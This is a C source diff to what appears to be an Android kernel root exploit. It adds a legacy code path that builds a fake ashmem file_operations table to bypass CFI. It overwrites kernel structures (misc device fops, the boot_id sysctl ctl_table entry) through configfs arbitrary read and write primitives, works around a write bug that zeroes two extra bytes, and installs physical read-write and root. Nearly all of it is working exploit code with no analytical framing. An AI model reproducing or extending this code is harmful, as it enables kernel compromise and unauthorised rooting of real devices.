@@ -37,7 +37,11 @@ static int one_page_span(uintptr_t start, size_t len) {
 }
 
 static int audit_fake_fops_table(int fd) {
+#if LEGACY_FOPS
+  enum { span = FOPS_SPLICE_READ_OFF + sizeof(uint64_t) };
+#else
   enum { span = FOPS_SHOW_FDINFO_OFF + sizeof(uint64_t) };
+#endif
   _Static_assert(span % sizeof(uint64_t) == 0, "fops span alignment");
   uint64_t table[span / sizeof(uint64_t)];
   if (!one_page_span(fake_fops, sizeof(table))) {
@@ -56,18 +60,26 @@ static int audit_fake_fops_table(int fd) {
     uint64_t value;
   } expected[] = {
     {FOPS_OWNER_OFF, 0},
+#if LEGACY_FOPS
+    {FOPS_LLSEEK_OFF, text_addr(NOOP_LLSEEK)},
+    {FOPS_READ_OFF, text_addr(CONFIGFS_READ_FILE)},
+    {FOPS_WRITE_OFF, text_addr(CONFIGFS_WRITE_FILE)},
+#else
     {FOPS_LLSEEK_OFF, data_addr(ASHMEM_MISC_FOPS)},
     {FOPS_READ_OFF, 0},
     {FOPS_WRITE_OFF, 0},
     {FOPS_READ_ITER_OFF, text_addr(CONFIGFS_READ_ITER)},
     {FOPS_WRITE_ITER_OFF, text_addr(CONFIGFS_BIN_WRITE_ITER)},
+#endif
     {FOPS_IOCTL_OFF, text_addr(ASHMEM_IOCTL)},
     {FOPS_COMPAT_IOCTL_OFF, text_addr(ASHMEM_COMPAT_IOCTL)},
     {FOPS_MMAP_OFF, text_addr(ASHMEM_MMAP)},
     {FOPS_OPEN_OFF, text_addr(ASHMEM_OPEN)},
     {FOPS_RELEASE_OFF, text_addr(ASHMEM_RELEASE)},
     {FOPS_SPLICE_READ_OFF, text_addr(COPY_SPLICE_READ)},
+#if !LEGACY_FOPS
     {FOPS_SHOW_FDINFO_OFF, text_addr(ASHMEM_SHOW_FDINFO)},
+#endif
   };
   pr_info("cfi fake fops span=%016zx-%016zx owner=%016llx llseek=%016llx read=%016llx write=%016llx\n",
           fake_fops, fake_fops + sizeof(table) - 1,
@@ -266,7 +278,9 @@ void do_pselect_fake_lock_route(void) {
 int repair_fake_fops_llseek(int fd) {
   uint64_t llseek = text_addr(NOOP_LLSEEK);
   uint64_t before = 0;
+#if !LEGACY_FOPS
   uint64_t after = 0;
+#endif
   uintptr_t slot = fake_fops + FOPS_LLSEEK_OFF;
   if (!one_page_span(slot, sizeof(llseek))) {
     errno = ERANGE;
@@ -282,17 +296,99 @@ int repair_fake_fops_llseek(int fd) {
   if (before == llseek) {
     return 1;
   }
+#if LEGACY_FOPS
+  /*
+   * The legacy faulting write always zeroes two bytes past its range.
+   * Writing the 8-byte llseek slot would clear the low half of .read at
+   * +0x10, so the table is built with NOOP_LLSEEK up front and a mismatch
+   * here is fatal instead of repairable.
+   */
+  pr_warning("cfi legacy llseek mismatch slot=%016zx\n", slot);
+  errno = EIO;
+  return 0;
+#else
   ssize_t wr = configfs_write_once(fd, slot, &llseek, sizeof(llseek));
   ssize_t rd = configfs_read_once(fd, slot, &after, sizeof(after));
   return wr == (ssize_t)sizeof(llseek) &&
          rd == (ssize_t)sizeof(after) &&
          after == llseek;
+#endif
 }
 
 int restore_slide_boot_id(int fd) {
+  slide_bootid_want = slide_canon_addr(SLIDE_SYSCTL_BOOTID);
+#if LEGACY_FOPS
+  /*
+   * The boot_id sysctl entry is a struct ctl_table: procname 0x00,
+   * data 0x08, maxlen 0x10, mode 0x14, child 0x18.  Writing only the
+   * data pointer would zero maxlen; write the first 0x18 bytes back as a
+   * snapshot and let the two collateral zeroes land in the child pointer,
+   * which must be NULL (verified before writing).
+   */
+  uintptr_t boot_id_entry =
+      SLIDE_RANDOM_TABLE_BOOT_ID_ENTRY + slide_p0_offset;
+  unsigned char entry[0x18];
+  unsigned char readback[0x18];
+  uint64_t child = 1;
+  memset(entry, 0, sizeof(entry));
+  memset(readback, 0, sizeof(readback));
+  ssize_t before_rd = configfs_read_once(
+      fd, boot_id_entry, entry, sizeof(entry));
+  configfs_read_once(fd, boot_id_entry + 0x18, &child, sizeof(child));
+  if (before_rd == (ssize_t)sizeof(entry)) {
+    memcpy(&slide_bootid_before, entry + 8, sizeof(slide_bootid_before));
+  }
+  if (before_rd != (ssize_t)sizeof(entry) || child != 0) {
+    pr_warning("slide restore boot_id entry read failed ret=%zd "
+               "child=%016llx errno=%d\n",
+               before_rd, (unsigned long long)child, errno);
+    return 0;
+  }
+  memcpy(entry + 8, &slide_bootid_want, sizeof(slide_bootid_want));
+  slide_bootid_restore_ret = configfs_write_once(
+      fd, boot_id_entry, entry, sizeof(entry));
+  ssize_t after_rd = configfs_read_once(
+      fd, boot_id_entry, readback, sizeof(readback));
+  if (after_rd == (ssize_t)sizeof(readback)) {
+    memcpy(&slide_bootid_after, readback + 8, sizeof(slide_bootid_after));
+  }
+  pr_info("slide restore boot_id entry pid=%d ret=%zd before=%016llx "
+          "want=%016llx after=%016llx read=%zd errno=%d\n",
+          getpid(), slide_bootid_restore_ret,
+          (unsigned long long)slide_bootid_before,
+          (unsigned long long)slide_bootid_want,
+          (unsigned long long)slide_bootid_after, after_rd, errno);
+  int boot_id_restored =
+      slide_bootid_restore_ret == (ssize_t)sizeof(entry) &&
+      after_rd == (ssize_t)sizeof(readback) &&
+      memcmp(readback, entry, sizeof(entry)) == 0;
+
+#ifdef SLIDE_RB_PARENT_TYPE_RESTORE
+  uintptr_t parent_type = SLIDE_NFULNL_LOGGER_OBJECT + slide_p0_offset +
+                          sizeof(uint64_t);
+  uint64_t type_before = 0;
+  uint64_t type_after = 0;
+  uint64_t type_want = SLIDE_RB_PARENT_TYPE_RESTORE;
+  configfs_read_once(fd, parent_type, &type_before, sizeof(type_before));
+  ssize_t type_restore_ret =
+      configfs_write_once(fd, parent_type, &type_want, sizeof(type_want));
+  configfs_read_once(fd, parent_type, &type_after, sizeof(type_after));
+  pr_warning("slide restore rb parent type pid=%d ret=%zd before=%016llx "
+             "want=%016llx after=%016llx errno=%d (legacy path zeroes two "
+             "bytes at object+0x10)\n",
+             getpid(), type_restore_ret,
+             (unsigned long long)type_before,
+             (unsigned long long)type_want,
+             (unsigned long long)type_after, errno);
+  return boot_id_restored &&
+         type_restore_ret == (ssize_t)sizeof(type_want) &&
+         type_after == type_want;
+#else
+  return boot_id_restored;
+#endif
+#else
   uintptr_t boot_id_data_ptr =
       SLIDE_RANDOM_TABLE_BOOT_ID_DATA_PTR + slide_p0_offset;
-  slide_bootid_want = slide_canon_addr(SLIDE_SYSCTL_BOOTID);
   configfs_read_once(
       fd, boot_id_data_ptr, &slide_bootid_before, sizeof(slide_bootid_before));
   slide_bootid_restore_ret =
@@ -332,11 +428,51 @@ int restore_slide_boot_id(int fd) {
 #else
   return boot_id_restored;
 #endif
+#endif
 }
 
 int install_child_root(int fd) {
   return install_pipe_physrw(fd) && install_android_root(fd);
 }
+
+#if LEGACY_FOPS
+/*
+ * The legacy write primitive zeroes two bytes after every range. Restoring
+ * only miscdevice->fops would clear the low half of miscdevice->list.next.
+ * Rewrite the whole fops..mode span (0x10..0x49) from a snapshot and let the
+ * two collateral zeroes fall into the 0x4a..0x4f tail padding before
+ * ashmem_shrinker.
+ */
+static int restore_misc_fops_bundle(
+    int fd, uintptr_t misc_fops, uint64_t original_fops) {
+  unsigned char before[ASHMEM_MISC_RESTORE_LEN];
+  unsigned char expect[ASHMEM_MISC_RESTORE_LEN];
+  unsigned char after[ASHMEM_MISC_RESTORE_LEN];
+  memset(before, 0, sizeof(before));
+  ssize_t rd = configfs_read_once(fd, misc_fops, before, sizeof(before));
+  if (rd != (ssize_t)sizeof(before)) {
+    pr_warning("cfi misc restore snapshot failed ret=%zd errno=%d\n",
+               rd, errno);
+    return 0;
+  }
+  memcpy(expect, before, sizeof(expect));
+  memcpy(expect, &original_fops, sizeof(original_fops));
+  ssize_t wr = configfs_write_once(fd, misc_fops, expect, sizeof(expect));
+  memset(after, 0, sizeof(after));
+  ssize_t rb = configfs_read_once(fd, misc_fops, after, sizeof(after));
+  uint64_t list_next = 0;
+  uint64_t list_prev = 0;
+  memcpy(&list_next, before + 0x08, sizeof(list_next));
+  memcpy(&list_prev, before + 0x10, sizeof(list_prev));
+  pr_info("cfi misc restore bundle ret=%zd read=%zd next=%016llx "
+          "prev=%016llx errno=%d\n",
+          wr, rb, (unsigned long long)list_next,
+          (unsigned long long)list_prev, errno);
+  return wr == (ssize_t)sizeof(expect) &&
+         rb == (ssize_t)sizeof(after) &&
+         memcmp(after, expect, sizeof(expect)) == 0;
+}
+#endif
 
 int try_cfi_stage(void) {
   cfi_attempts++;
@@ -440,8 +576,14 @@ int try_cfi_stage(void) {
   uint64_t original_fops = canon_addr(ASHMEM_FOPS);
   pr_info("cfi restoring misc_fops target=%016zx value=%016llx\n",
           misc_fops, (unsigned long long)original_fops);
+#if LEGACY_FOPS
+  int bundle_ok =
+      restore_misc_fops_bundle(fd, misc_fops, original_fops);
+  ssize_t restore = bundle_ok ? (ssize_t)sizeof(original_fops) : -1;
+#else
   ssize_t restore = configfs_write_once(
       fd, misc_fops, &original_fops, sizeof(original_fops));
+#endif
   cfi_restore_ret = restore;
   if (restore != (ssize_t)sizeof(original_fops)) {
     cfi_last_step = 5;
@@ -581,8 +723,15 @@ fail:
     if (kaslr_done) {
       original_fops_fail = canon_addr(ASHMEM_FOPS);
     }
+#if LEGACY_FOPS
+    cfi_restore_ret =
+      restore_misc_fops_bundle(fd, misc_fops, original_fops_fail)
+          ? (ssize_t)sizeof(original_fops_fail)
+          : -1;
+#else
     cfi_restore_ret = configfs_write_once(
         fd, misc_fops, &original_fops_fail, sizeof(original_fops_fail));
+#endif
     if (can_read_back &&
         cfi_restore_ret == (ssize_t)sizeof(original_fops_fail)) {
       uint64_t after_fail = 0;
